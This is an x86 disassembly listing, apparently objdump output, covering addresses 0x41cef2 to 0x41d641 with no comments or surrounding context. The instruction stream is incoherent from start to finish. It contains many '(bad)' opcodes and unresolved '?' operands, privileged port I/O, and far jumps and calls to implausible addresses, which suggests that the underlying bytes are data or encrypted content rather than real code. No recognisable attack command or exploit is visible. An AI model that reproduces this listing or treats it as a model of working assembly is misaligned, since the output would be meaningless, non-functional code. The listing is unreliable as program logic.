  41cef2:	adc    eax,0x296ba5c5
  41cef7:	cdq    
  41cef8:	arpl   WORD PTR [esi],cx
  41cefa:	jb     0x41cf3d
  41cefc:	scas   al,BYTE PTR es:[edi]
  41cefd:	or     cl,BYTE PTR [edx]
  41ceff:	fidivr DWORD PTR [esi+0x75]
  41cf02:	lods   eax,DWORD PTR ds:[esi]
  41cf03:	pop    edi
  41cf04:	mov    esi,0xc6ee4761
  41cf09:	nop
  41cf0a:	out    0x7,al
  41cf0c:	xchg   ebp,eax
  41cf0d:	mov    eax,0x1f2f1c5d
  41cf12:	dec    eax
  41cf13:	les    ebp,FWORD PTR [esi+0x5b01e129]
  41cf19:	mov    eax,0xc50a2fa
  41cf1e:	cmc    
  41cf1f:	aaa    
  41cf20:	push   eax
  41cf21:	aaa    
  41cf22:	popf   
  41cf23:	test   eax,0xc4d00ea9
  41cf28:	pop    esp
  41cf29:	cmp    eax,DWORD PTR [edi+ebx*2+0x7abdd380]
  41cf30:	mov    ?,WORD PTR [ebx+0x71]
  41cf33:	jne    0x41ced3
  41cf35:	and    eax,0xd70588a4
  41cf3a:	inc    esi
  41cf3b:	psubsw mm4,QWORD PTR [esi+eax*1+0x57fcf2cb]
  41cf43:	mov    BYTE PTR [eax-0x61176183],bl
  41cf49:	gs cmc 
  41cf4b:	cmp    ebx,esi
  41cf4d:	cld    
  41cf4e:	xor    DWORD PTR [edx+eax*8+0x205cc881],ebx
  41cf55:	pusha  
  41cf56:	in     eax,dx
  41cf57:	sub    al,0xc0
  41cf59:	xchg   esp,eax
  41cf5a:	xchg   DWORD PTR ds:0xacac79b2,eax
  41cf60:	scas   al,BYTE PTR es:[edi]
  41cf61:	aas    
  41cf62:	ret    
  41cf63:	and    DWORD PTR [ebx-0x667dc6b4],esp
  41cf69:	lods   eax,DWORD PTR ds:[esi]
  41cf6a:	stc    
  41cf6b:	out    dx,al
  41cf6c:	cmp    DWORD PTR [edi-0x75],edi
  41cf6f:	or     al,0x4f
  41cf71:	sub    bh,BYTE PTR [ebp-0x19]
  41cf74:	(bad)  
  41cf75:	fldenv [ebx+0x5b]
  41cf78:	sar    BYTE PTR [ecx+0x2],0x31
  41cf7c:	xchg   esp,eax
  41cf7d:	cmp    al,0x38
  41cf7f:	push   edi
  41cf80:	pop    ebp
  41cf81:	xchg   ebx,eax
  41cf82:	add    al,0x91
  41cf84:	repz fld QWORD PTR [edx-0x646079db]
  41cf8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf8c:	aas    
  41cf8d:	jg     0x41cfb2
  41cf8f:	sbb    BYTE PTR [ecx],0x22
  41cf92:	stos   BYTE PTR es:[edi],al
  41cf93:	mov    ah,0x49
  41cf95:	mov    edx,DWORD PTR [ecx-0x661b9794]
  41cf9b:	je     0x41cf8d
  41cf9d:	xchg   edx,eax
  41cf9e:	aas    
  41cf9f:	mov    al,0xf5
  41cfa1:	ret    0xd9a2
  41cfa4:	jbe    0x41cf9b
  41cfa6:	xor    ecx,esi
  41cfa8:	xor    eax,0x2a793415
  41cfad:	rcr    edi,0x50
  41cfb0:	or     BYTE PTR [esi+0x2d],ch
  41cfb3:	sti    
  41cfb4:	iret   
  41cfb5:	shl    ah,cl
  41cfb7:	pop    ds
  41cfb8:	ja     0x41cf76
  41cfba:	or     esi,DWORD PTR [edx]
  41cfbc:	dec    esp
  41cfbd:	pop    esp
  41cfbe:	xlat   BYTE PTR ds:[ebx]
  41cfbf:	mov    dh,0xd2
  41cfc1:	and    ebp,DWORD PTR [eax]
  41cfc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfc4:	sbb    ecx,DWORD PTR [eax]
  41cfc6:	cwde   
  41cfc7:	and    eax,0x4a004fd8
  41cfcc:	sbb    ah,BYTE PTR [esi+ebx*8]
  41cfcf:	lods   al,BYTE PTR ds:[esi]
  41cfd0:	and    bl,al
  41cfd2:	jne    0x41cfb4
  41cfd4:	retf   
  41cfd5:	mov    edi,0x641b493e
  41cfda:	stos   BYTE PTR es:[edi],al
  41cfdb:	xor    BYTE PTR [edx],ah
  41cfdd:	pop    esp
  41cfde:	inc    edi
  41cfdf:	daa    
  41cfe0:	jns    0x41d011
  41cfe2:	cmp    bh,ch
  41cfe4:	and    DWORD PTR [ebx+0x88ec070],eax
  41cfea:	mov    ds:0xc33dc487,eax
  41cfef:	jae    0x41cf91
  41cff1:	cmp    edi,DWORD PTR [esi-0x2f]
  41cff4:	jecxz  0x41d06b
  41cff6:	shl    BYTE PTR [esi-0x6f],cl
  41cff9:	sbb    DWORD PTR [ebx-0x53eb1687],esi
  41cfff:	retf   0x4c4c
  41d002:	xchg   ebx,eax
  41d003:	js     0x41d019
  41d005:	mov    bh,0xfe
  41d007:	jp     0x41cfed
  41d009:	push   esi
  41d00a:	xchg   edi,eax
  41d00b:	adc    eax,0x4b1ff8e
  41d010:	imul   edx,ebp,0xffffffe8
  41d013:	mov    cl,0xc
  41d015:	je     0x41cf9e
  41d017:	add    BYTE PTR ds:0xcf944ff9,bl
  41d01d:	adc    eax,0x19712dbc
  41d022:	icebp  
  41d023:	mov    bh,0x3a
  41d025:	lahf   
  41d026:	test   dh,dl
  41d028:	cs mov ?,ebx
  41d02b:	cwde   
  41d02c:	cli    
  41d02d:	or     BYTE PTR [edi+0xb075f12],ch
  41d033:	xchg   esp,eax
  41d034:	je     0x41d007
  41d036:	data16 (bad) 
  41d038:	mov    edx,DWORD PTR [ebx-0x22]
  41d03b:	fwait
  41d03c:	jp     0x41cfeb
  41d03e:	(bad)  
  41d03f:	out    dx,al
  41d040:	test   al,0x7f
  41d042:	in     eax,0x6e
  41d044:	jmp    0x950b:0x66f61de8
  41d04b:	xchg   ebp,eax
  41d04c:	fs mov eax,fs:0x66d2a7dd
  41d053:	and    DWORD PTR [ecx+0x4e],ebp
  41d056:	icebp  
  41d057:	mov    ebp,0xc598a7a6
  41d05c:	enter  0xfcf5,0xd0
  41d060:	mov    ah,0x1a
  41d062:	repz mov ds:0x23b23ce,eax
  41d068:	fidivr DWORD PTR [ebp+0x41146aab]
  41d06e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d06f:	call   0xfe396f34
  41d074:	stc    
  41d075:	enter  0xd169,0x1a
  41d079:	sbb    esi,eax
  41d07b:	and    eax,0xbb705ae2
  41d080:	in     al,dx
  41d081:	aas    
  41d082:	popa   
  41d083:	jne    0x41d067
  41d085:	dec    eax
  41d086:	xor    DWORD PTR [eax+ebx*1-0x3],0xffffff9f
  41d08b:	xchg   ebx,eax
  41d08c:	and    al,0x8f
  41d08e:	and    bl,BYTE PTR [eax]
  41d090:	cmc    
  41d091:	(bad)
  41d095:	cmp    eax,0xa75a3e01
  41d09a:	add    edx,0xffffffec
  41d09d:	xchg   esp,ecx
  41d09f:	push   es
  41d0a0:	mov    ah,0xd9
  41d0a2:	inc    edi
  41d0a3:	adc    eax,0xf2c90ada
  41d0a8:	xchg   ecx,eax
  41d0a9:	xchg   esp,eax
  41d0aa:	push   edi
  41d0ab:	dec    esi
  41d0ac:	out    dx,al
  41d0ad:	add    DWORD PTR [edx+ebx*2],ebx
  41d0b0:	pop    esp
  41d0b1:	mov    eax,0xabba7b46
  41d0b6:	clc    
  41d0b7:	sahf   
  41d0b8:	in     al,dx
  41d0b9:	xchg   esp,eax
  41d0ba:	jb     0x41d0c2
  41d0bc:	es aad 0x82
  41d0bf:	stos   DWORD PTR es:[edi],eax
  41d0c0:	push   ss
  41d0c1:	push   esi
  41d0c2:	dec    ecx
  41d0c3:	leave  
  41d0c4:	dec    esp
  41d0c5:	sar    edi,cl
  41d0c7:	imul   esi,DWORD PTR [esi],0x1e
  41d0ca:	shr    dh,0x70
  41d0cd:	imul   esp,esp,0x36622fb1
  41d0d3:	push   ss
  41d0d4:	inc    edi
  41d0d5:	add    al,0x91
  41d0d7:	sub    esi,DWORD PTR [ecx-0x61]
  41d0da:	adc    eax,0xcc8c1c7d
  41d0df:	push   es
  41d0e0:	sbb    eax,0x71da1eee
  41d0e5:	nop
  41d0e6:	cmp    eax,0x26fb34f5
  41d0eb:	lods   al,BYTE PTR ds:[esi]
  41d0ec:	sub    al,0x1b
  41d0ee:	xchg   esp,eax
  41d0ef:	mov    fs,WORD PTR [esi+0x6d464f86]
  41d0f5:	call   0xa40a5dec
  41d0fa:	mov    ecx,0xb04ad852
  41d0ff:	pushf  
  41d100:	pusha  
  41d101:	cld    
  41d102:	push   ecx
  41d103:	nop
  41d104:	add    eax,0xe0e6c448
  41d109:	(bad)  
  41d10a:	sbb    al,0xc2
  41d10c:	lock mov WORD PTR [edi+ebp*1+0x4fddd745],ss
  41d114:	dec    edi
  41d115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d116:	lods   al,BYTE PTR ds:[esi]
  41d117:	dec    ecx
  41d118:	popa   
  41d119:	or     ebx,DWORD PTR [ebx]
  41d11b:	push   ss
  41d11c:	or     DWORD PTR [edi],edx
  41d11e:	push   ebp
  41d11f:	in     eax,0xdd
  41d121:	or     BYTE PTR [esi-0x1b],0x7a
  41d125:	sbb    DWORD PTR [ecx-0x56],ebp
  41d128:	mov    al,0xe4
  41d12a:	dec    esi
  41d12b:	loopne 0x41d130
  41d12d:	or     eax,0x633ad0af
  41d132:	test   al,0x6a
  41d134:	mov    ecx,0x7c6fbe80
  41d139:	jo     0x41d11f
  41d13b:	add    DWORD PTR [edi],0x31d23462
  41d141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d142:	push   edx
  41d143:	xor    DWORD PTR [edi+0x1a],edi
  41d146:	outs   dx,BYTE PTR ds:[esi]
  41d147:	cld    
  41d148:	ret    0xe352
  41d14b:	mov    ds:0xd6f437d5,al
  41d150:	sar    DWORD PTR [ecx+0x73],cl
  41d153:	xchg   esp,eax
  41d154:	pop    ss
  41d155:	(bad)  
  41d156:	sti    
  41d157:	icebp  
  41d158:	mov    ebx,0x38beee81
  41d15d:	(bad)  
  41d15e:	sub    esp,edi
  41d160:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41d162:	adc    DWORD PTR [esi-0x1],edx
  41d165:	aad    0x5b
  41d167:	mov    ds:0x2344463d,al
  41d16c:	push   ds
  41d16d:	rol    DWORD PTR [edx-0x6188708b],1
  41d173:	push   esp
  41d174:	aaa    
  41d175:	dec    eax
  41d176:	sbb    eax,0x9ce36e25
  41d17b:	mov    BYTE PTR [ebp+0x5c271883],dl
  41d181:	fs aaa 
  41d183:	pop    ecx
  41d184:	or     DWORD PTR [ecx+ebp*8-0x14],ecx
  41d188:	aad    0x8d
  41d18a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d18b:	daa    
  41d18c:	mov    ah,BYTE PTR [edx+0x1f3e7a78]
  41d192:	and    DWORD PTR [edx+ecx*4],0xc6917c24
  41d199:	dec    ebx
  41d19a:	push   ds
  41d19b:	and    eax,0x4b2f1f6d
  41d1a0:	push   esi
  41d1a1:	lock outs dx,BYTE PTR ds:[esi]
  41d1a3:	imul   ebp,edx,0x7c
  41d1a6:	fisttp WORD PTR [ebx-0x40]
  41d1a9:	dec    edx
  41d1aa:	sar    DWORD PTR [esi-0x39],1
  41d1ad:	add    BYTE PTR [ebp+0x6c],al
  41d1b0:	pop    esi
  41d1b1:	test   DWORD PTR ds:0xff0d64ce,ecx
  41d1b7:	ss adc edi,eax
  41d1ba:	or     ah,BYTE PTR [eax-0x6f]
  41d1bd:	or     al,ah
  41d1bf:	in     eax,dx
  41d1c0:	cli    
  41d1c1:	xchg   esi,eax
  41d1c2:	inc    edx
  41d1c3:	out    dx,al
  41d1c4:	out    0x1c,al
  41d1c6:	and    eax,DWORD PTR [ebx+0x0]
  41d1c9:	push   ds
  41d1ca:	iret   
  41d1cb:	mov    dl,0x4c
  41d1cd:	cwde   
  41d1ce:	shl    DWORD PTR [ebp-0x27191e22],0x78
  41d1d5:	add    BYTE PTR [edi],0x47
  41d1d8:	mov    dh,0xd6
  41d1da:	int3   
  41d1db:	js     0x41d195
  41d1dd:	ja     0x41d1bb
  41d1df:	ja     0x41d1cf
  41d1e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1e2:	cmc    
  41d1e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1e5:	sbb    eax,0x2081bab5
  41d1ea:	scas   eax,DWORD PTR es:[edi]
  41d1eb:	xchg   esi,eax
  41d1ec:	rol    BYTE PTR [eax+0xf244c34],1
  41d1f2:	loop   0x41d1a1
  41d1f4:	lods   eax,DWORD PTR ds:[esi]
  41d1f5:	bound  edi,QWORD PTR [ebx]
  41d1f7:	cwde   
  41d1f8:	ss jl  0x41d1c4
  41d1fb:	mov    ah,BYTE PTR [ecx+esi*2]
  41d1fe:	add    BYTE PTR [esp+ebx*2],0x4d
  41d202:	idiv   eax
  41d204:	mov    DWORD PTR [ebp+0x6f790399],eax
  41d20a:	aas    
  41d20b:	lea    edi,[ecx-0x2e715047]
  41d211:	push   edx
  41d212:	inc    edx
  41d213:	fimul  WORD PTR [eax+0x44c3d706]
  41d219:	outs   dx,DWORD PTR ds:[esi]
  41d21a:	addr16 push ds
  41d21c:	mov    ah,0x2e
  41d21e:	cmc    
  41d21f:	adc    ch,BYTE PTR [ebx]
  41d221:	push   eax
  41d222:	xchg   ecx,eax
  41d223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d224:	sub    eax,0xe181e1bd
  41d229:	in     al,0xc8
  41d22b:	xchg   edi,eax
  41d22c:	mov    eax,0x6c000ad4
  41d231:	(bad)  
  41d232:	mov    edi,0x71d9af4
  41d237:	push   esp
  41d238:	mov    edi,0xf840f931
  41d23d:	inc    edi
  41d23e:	or     al,0x38
  41d240:	push   edx
  41d241:	push   eax
  41d242:	mov    esp,0x3af4eb13
  41d247:	jecxz  0x41d295
  41d249:	adc    BYTE PTR [ecx],dh
  41d24b:	test   DWORD PTR [eax+0x1a272e3a],ebp
  41d251:	scas   eax,DWORD PTR es:[edi]
  41d252:	mov    ?,WORD PTR [eax+0x5a2e7ef6]
  41d258:	fcmovnb st,st(5)
  41d25a:	scas   eax,DWORD PTR es:[edi]
  41d25b:	mov    ecx,0xcc07319d
  41d260:	and    al,0x72
  41d262:	into   
  41d263:	mov    bl,0xad
  41d265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d266:	inc    ecx
  41d267:	cmp    al,0x2a
  41d269:	sbb    eax,0x21fcf417
  41d26e:	push   eax
  41d26f:	fdivr  QWORD PTR [edi-0x56f85532]
  41d275:	adc    BYTE PTR [eax+0x26308c9a],bl
  41d27b:	fld    DWORD PTR [ebp+0x74b41eb9]
  41d281:	hlt    
  41d282:	fisubr WORD PTR [edx+0x57]
  41d285:	mov    ebp,0x89462aed
  41d28a:	jo     0x41d2a7
  41d28c:	push   edx
  41d28d:	cmp    BYTE PTR [edx],cl
  41d28f:	push   ecx
  41d290:	dec    edx
  41d291:	mov    ecx,0x39e8de5c
  41d296:	aaa    
  41d297:	lods   eax,DWORD PTR ds:[esi]
  41d298:	jg     0x41d2ca
  41d29a:	popf   
  41d29b:	aas    
  41d29c:	sti    
  41d29d:	loopne 0x41d28f
  41d29f:	and    BYTE PTR [ebx+0x7fee328e],0x3e
  41d2a6:	and    eax,0x47e0176a
  41d2ab:	sbb    al,0x89
  41d2ad:	call   0x967f986a
  41d2b2:	rcl    BYTE PTR [edx],1
  41d2b4:	aas    
  41d2b5:	les    ebx,FWORD PTR [eax+0x4f]
  41d2b8:	inc    edx
  41d2b9:	in     al,dx
  41d2ba:	imul   eax,ebx,0xfffffff0
  41d2bd:	push   esp
  41d2be:	inc    ebp
  41d2bf:	int3   
  41d2c0:	push   esp
  41d2c1:	imul   eax,ebp,0x57e5c40c
  41d2c7:	xor    eax,0xda73fda3
  41d2cc:	xchg   BYTE PTR [eax-0x52],ah
  41d2cf:	rcr    DWORD PTR [ebx+edi*2-0x4e],1
  41d2d3:	sbb    BYTE PTR [ebx+0x4d],ch
  41d2d6:	inc    edi
  41d2d7:	cmp    ch,BYTE PTR [edx+ebx*4+0x74]
  41d2db:	inc    edi
  41d2dc:	push   cs
  41d2dd:	pop    edx
  41d2de:	add    eax,0xf849ed5
  41d2e3:	pop    eax
  41d2e4:	dec    ebp
  41d2e5:	and    al,0xd2
  41d2e7:	in     eax,0x68
  41d2e9:	cdq    
  41d2ea:	and    bl,BYTE PTR ds:0x9efa246c
  41d2f0:	loopne 0x41d295
  41d2f2:	dec    eax
  41d2f3:	adc    BYTE PTR [esi],ch
  41d2f5:	adc    DWORD PTR [edx-0x2531ebc8],edx
  41d2fb:	dec    edx
  41d2fc:	jmp    0xdc80:0xdda437a
  41d303:	fadd   st,st(1)
  41d305:	retf   
  41d306:	pop    es
  41d307:	pop    esi
  41d308:	iret   
  41d309:	lds    esp,FWORD PTR [ecx-0x60b83f95]
  41d30f:	sub    ah,BYTE PTR [edi]
  41d311:	mov    edi,0x96c0f199
  41d316:	inc    ecx
  41d317:	sbb    al,0x2c
  41d319:	js     0x41d36e
  41d31b:	stos   DWORD PTR es:[edi],eax
  41d31c:	ror    eax,0x71
  41d31f:	icebp  
  41d320:	jae    0x41d387
  41d322:	jbe    0x41d2e1
  41d324:	popf   
  41d325:	(bad)  
  41d326:	icebp  
  41d327:	sbb    al,0x46
  41d329:	aaa    
  41d32a:	lahf   
  41d32b:	jg     0x41d38e
  41d32d:	rcr    BYTE PTR [ebp+0x59],1
  41d330:	inc    edx
  41d331:	dec    ecx
  41d332:	lds    edx,FWORD PTR [esi+0x77]
  41d335:	data16 (bad) 
  41d337:	in     al,dx
  41d338:	xchg   esi,eax
  41d339:	dec    ebp
  41d33a:	jp     0x41d375
  41d33c:	jmp    DWORD PTR [edi+0x3f439ab8]
  41d342:	jecxz  0x41d368
  41d344:	(bad)  
  41d345:	xor    DWORD PTR [eax-0x13745f97],edx
  41d34b:	scas   al,BYTE PTR es:[edi]
  41d34c:	nop
  41d34d:	jge    0x41d344
  41d34f:	fstp   TBYTE PTR [ecx]
  41d351:	inc    ebx
  41d352:	inc    edi
  41d353:	add    eax,0x72689df9
  41d358:	sub    BYTE PTR [edi+0x73d7fd2e],ch
  41d35e:	(bad)  
  41d35f:	mov    al,ds:0x1f81c5a7
  41d364:	pusha  
  41d365:	enter  0x9fe0,0xa0
  41d369:	rcl    BYTE PTR [eax+edx*4-0x4a],0xb5
  41d36e:	out    0x13,al
  41d370:	sbb    eax,0x715246dc
  41d375:	dec    edx
  41d376:	pop    eax
  41d377:	xor    esi,esp
  41d379:	stos   DWORD PTR es:[edi],eax
  41d37a:	mov    edi,0x6b44a745
  41d37f:	sbb    ebp,ebp
  41d381:	loop   0x41d320
  41d383:	stos   BYTE PTR es:[edi],al
  41d384:	imul   edx,DWORD PTR [esi],0xd92e7ac8
  41d38a:	call   0x20da:0x974be056
  41d391:	xchg   edi,eax
  41d392:	pop    ds
  41d393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d394:	mov    al,0xa1
  41d396:	jmp    0x22b0d14c
  41d39b:	push   eax
  41d39c:	sbb    al,0xb4
  41d39e:	retf   0x969a
  41d3a1:	in     al,dx
  41d3a2:	lahf   
  41d3a3:	adc    dh,al
  41d3a5:	push   ss
  41d3a6:	loope  0x41d354
  41d3a8:	fbld   TBYTE PTR [edx]
  41d3aa:	mov    ecx,0x66cc2242
  41d3af:	hlt    
  41d3b0:	mov    ebx,0xbdc06f01
  41d3b5:	fstp   TBYTE PTR [edi-0x23a47acc]
  41d3bb:	clc    
  41d3bc:	loope  0x41d3fa
  41d3be:	inc    ebp
  41d3bf:	xor    ebp,esp
  41d3c1:	xor    al,0xae
  41d3c3:	add    al,0x32
  41d3c5:	push   esi
  41d3c6:	adc    dl,BYTE PTR [ebp-0x3add7607]
  41d3cc:	or     al,0x3d
  41d3ce:	fsub   QWORD PTR [ebp+0x14540591]
  41d3d4:	in     al,0x9e
  41d3d6:	repz cld 
  41d3d8:	xchg   edx,eax
  41d3d9:	pusha  
  41d3da:	ins    DWORD PTR es:[edi],dx
  41d3db:	cmp    eax,0xc3949889
  41d3e0:	push   ds
  41d3e1:	mov    WORD PTR [ebx-0x7380233e],?
  41d3e7:	cmp    DWORD PTR [edi+0x75],0xaf769868
  41d3ee:	push   ds
  41d3ef:	dec    esp
  41d3f0:	and    DWORD PTR [edi],ebp
  41d3f2:	xchg   bl,dh
  41d3f4:	pop    edx
  41d3f5:	push   ebx
  41d3f6:	repnz adc DWORD PTR [esi+edx*4],0x769d6d73
  41d3fe:	sbb    BYTE PTR [ecx+0x6e],0x6a
  41d402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d403:	jp     0x41d3ce
  41d405:	sahf   
  41d406:	fst    DWORD PTR [ecx]
  41d408:	adc    ebx,esi
  41d40a:	dec    ebp
  41d40b:	fisttp QWORD PTR [esi]
  41d40d:	jns    0x41d3a7
  41d40f:	cmp    eax,0x729c54bd
  41d414:	test   DWORD PTR [eiz*2+0x2f345305],esp
  41d41b:	cmp    BYTE PTR [edi-0x7a29446e],ah
  41d421:	mov    WORD PTR [edx-0x5e],es
  41d424:	mov    cl,0x18
  41d426:	std    
  41d427:	rcl    DWORD PTR [edx+0x2c],1
  41d42a:	inc    edx
  41d42b:	push   0xffffffb8
  41d42d:	jo     0x41d428
  41d42f:	mov    ah,0xc3
  41d431:	cmp    ebp,DWORD PTR [edx+0xe90dcaa]
  41d437:	adc    ch,ch
  41d439:	mov    eax,DWORD PTR [ebx-0x57]
  41d43c:	sub    BYTE PTR [esi+eax*8+0x31ad6504],0xad
  41d444:	sub    al,0x7c
  41d446:	mov    ebp,0x6dab9157
  41d44b:	imul   edx,DWORD PTR [ecx],0x55c062b4
  41d451:	cs push cs
  41d453:	in     eax,0x12
  41d455:	and    ebp,eax
  41d457:	xor    BYTE PTR [edx],ch
  41d459:	jg     0x41d47d
  41d45b:	cwde   
  41d45c:	mov    al,ds:0xf93072
  41d461:	jmp    0x98908405
  41d466:	gs adc dl,dh
  41d469:	adc    ebx,edi
  41d46b:	out    0x7f,al
  41d46d:	aad    0xdb
  41d46f:	les    ebp,FWORD PTR [ebp-0x70aa529b]
  41d475:	out    dx,al
  41d476:	xor    BYTE PTR [eax+0xe],bh
  41d479:	std    
  41d47a:	mov    bh,0x8d
  41d47c:	mov    eax,DWORD PTR [ebx]
  41d47e:	loope  0x41d4a6
  41d480:	and    ah,BYTE PTR [edx-0x75309588]
  41d486:	add    DWORD PTR [edi],esi
  41d488:	push   edi
  41d489:	xor    eax,esp
  41d48b:	pushf  
  41d48c:	mov    ch,0xdd
  41d48e:	sbb    BYTE PTR [ecx],bh
  41d490:	std    
  41d491:	in     eax,0xe3
  41d493:	sbb    al,0xaf
  41d495:	adc    BYTE PTR [ebx+0x6f73ac42],cl
  41d49b:	hlt    
  41d49c:	mov    dl,0x69
  41d49e:	or     ebp,ecx
  41d4a0:	test   ebx,esp
  41d4a2:	pop    esp
  41d4a3:	mov    ch,0xb9
  41d4a5:	mov    bl,0xbd
  41d4a7:	xor    al,0x61
  41d4a9:	mov    es,WORD PTR [eax+edi*8+0x6e2effbf]
  41d4b0:	mov    dl,0xea
  41d4b2:	jg     0x41d50a
  41d4b4:	lds    eax,FWORD PTR [esi+0x66af8f08]
  41d4ba:	shl    DWORD PTR [esi],cl
  41d4bc:	rcl    edi,cl
  41d4be:	mov    bh,0xce
  41d4c0:	loop   0x41d46b
  41d4c2:	mov    cl,0x20
  41d4c4:	cmp    DWORD PTR ds:0x7b3da889,edi
  41d4ca:	xor    al,0xbc
  41d4cc:	mov    edx,DWORD PTR [esi+eiz*2+0x1256f12f]
  41d4d3:	add    BYTE PTR [eax+0x65092f18],cl
  41d4d9:	fsubr  QWORD PTR [ebx-0x810e107]
  41d4df:	sbb    cl,BYTE PTR [eax-0x5e]
  41d4e2:	jbe    0x41d486
  41d4e4:	or     edx,DWORD PTR [ecx+edx*2+0x51fed10]
  41d4eb:	dec    edi
  41d4ec:	outs   dx,BYTE PTR ds:[esi]
  41d4ed:	sbb    DWORD PTR [eax-0x1e8acab3],edi
  41d4f3:	(bad)  
  41d4f4:	shl    BYTE PTR [esi-0x2b9a0001],cl
  41d4fa:	ds loopne 0x41d540
  41d4fd:	inc    ebp
  41d4fe:	out    dx,al
  41d4ff:	div    DWORD PTR [edx+0x55]
  41d502:	es test ebp,esp
  41d505:	jo     0x41d4be
  41d507:	fsubr  QWORD PTR [ecx+0x62]
  41d50a:	pop    es
  41d50b:	arpl   ax,dx
  41d50d:	adc    edx,DWORD PTR [ecx]
  41d50f:	cmp    al,0x94
  41d511:	popf   
  41d512:	cmc    
  41d513:	dec    eax
  41d514:	add    al,0x82
  41d516:	fisubr DWORD PTR [edi+0x42091436]
  41d51c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41d51e:	or     dl,ch
  41d520:	cli    
  41d521:	cld    
  41d522:	iret   
  41d523:	fisub  DWORD PTR [esi]
  41d525:	fild   QWORD PTR [edx]
  41d527:	(bad)  
  41d528:	nop
  41d529:	jae    0x41d4ec
  41d52b:	inc    ebx
  41d52c:	fisttp WORD PTR [esi-0x7f1dfbdf]
  41d532:	daa    
  41d533:	in     al,dx
  41d534:	mov    esi,DWORD PTR [edi]
  41d536:	adc    eax,0x72d1731c
  41d53b:	push   esi
  41d53c:	pop    edi
  41d53d:	jbe    0x41d534
  41d53f:	call   ebx
  41d541:	inc    edi
  41d542:	pop    ecx
  41d543:	sbb    al,0x36
  41d545:	pop    ss
  41d546:	xor    esi,0xffffffba
  41d549:	inc    ebx
  41d54a:	sbb    DWORD PTR [edi-0x13],0xb476c82f
  41d551:	ds sbb al,0x62
  41d554:	mov    edi,DWORD PTR [eax]
  41d556:	rcl    BYTE PTR [ecx],cl
  41d558:	push   cs
  41d559:	mov    bl,0x70
  41d55b:	mov    ds:0x79dae343,eax
  41d560:	test   ebx,edi
  41d562:	sbb    edi,ebp
  41d564:	and    DWORD PTR [edx+ecx*2-0x236512ba],0x16f74dba
  41d56f:	call   0x5eaaa305
  41d574:	ror    BYTE PTR [edi],0x49
  41d577:	pop    ebx
  41d578:	mov    ecx,0xa4831586
  41d57d:	inc    esi
  41d57e:	bound  esi,QWORD PTR [ebx]
  41d580:	aas    
  41d581:	mov    WORD PTR [edx+0x5045d857],gs
  41d587:	aam    0x51
  41d589:	mov    BYTE PTR [eax+ecx*2+0x60],al
  41d58d:	pushf  
  41d58e:	dec    edi
  41d58f:	jno    0x41d5a9
  41d591:	test   BYTE PTR [ebx+ecx*1-0x49],ch
  41d595:	inc    ebx
  41d596:	jb     0x41d550
  41d598:	ds ja  0x41d526
  41d59b:	jp     0x41d5a2
  41d59d:	lahf   
  41d59e:	pop    ebp
  41d59f:	retf   
  41d5a0:	test   dh,dl
  41d5a2:	pop    ds
  41d5a3:	stos   DWORD PTR es:[edi],eax
  41d5a4:	outs   dx,DWORD PTR ds:[esi]
  41d5a5:	cdq    
  41d5a6:	call   0xb152f05
  41d5ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5ac:	jb     0x41d60b
  41d5ae:	add    dh,BYTE PTR [edx-0x7ebb176c]
  41d5b4:	and    DWORD PTR [eax+0x6e81cf7],0xffffff92
  41d5bb:	dec    esp
  41d5bc:	push   edi
  41d5bd:	(bad)  
  41d5be:	or     BYTE PTR [edi-0x2738fea9],bh
  41d5c4:	mov    esp,0xb6c815d1
  41d5c9:	and    ch,bl
  41d5cb:	inc    DWORD PTR [ebx-0x328a2244]
  41d5d1:	loope  0x41d5d5
  41d5d3:	sbb    esp,DWORD PTR [ecx]
  41d5d5:	mov    edi,0xc9b8683e
  41d5da:	sub    BYTE PTR [eax-0x15],al
  41d5dd:	loop   0x41d5d6
  41d5df:	pop    edx
  41d5e0:	inc    edx
  41d5e1:	mov    esi,DWORD PTR [ebp+0x570ee0e4]
  41d5e7:	push   0x3d
  41d5e9:	mov    DWORD PTR [ebx+0x28],esp
  41d5ec:	sbb    ebx,eax
  41d5ee:	call   0x74fb57ff
  41d5f3:	(bad)  
  41d5f4:	cmc    
  41d5f5:	shl    esi,0xce
  41d5f8:	in     al,dx
  41d5f9:	xor    dl,BYTE PTR [edx+0x4c]
  41d5fc:	(bad)  
  41d5fe:	xchg   edi,eax
  41d5ff:	fsub   st(4),st
  41d601:	cs ja  0x41d681
  41d604:	mov    ecx,0x1372c2eb
  41d609:	aaa    
  41d60a:	aaa    
  41d60b:	jg     0x41d627
  41d60d:	imul   ecx,esi,0x6a
  41d610:	(bad)  [edi+0x45]
  41d613:	cmp    cl,BYTE PTR [edx]
  41d615:	jecxz  0x41d65d
  41d617:	sbb    al,0x68
  41d619:	(bad)  
  41d61a:	push   0x64
  41d61c:	stos   DWORD PTR es:[edi],eax
  41d61d:	scas   al,BYTE PTR es:[edi]
  41d61e:	push   ebp
  41d61f:	les    edi,FWORD PTR [eax+ebp*8]
  41d622:	dec    esi
  41d623:	es xor eax,esp
  41d626:	pop    edi
  41d627:	retf   
  41d628:	ins    DWORD PTR es:[edi],dx
  41d629:	jp     0x41d668
  41d62b:	add    edi,DWORD PTR fs:[ecx]
  41d62e:	rol    DWORD PTR [edx],1
  41d630:	xchg   ebp,eax
  41d631:	adc    al,0x58
  41d633:	and    bl,BYTE PTR [eax+0x98f2ed9]
  41d639:	inc    esp
  41d63a:	xlat   BYTE PTR ds:[ebx]
  41d63b:	pop    edi
  41d63c:	gs clc 
  41d63e:	add    DWORD PTR [esi+esi*2],ecx
  41d641:	icebp  
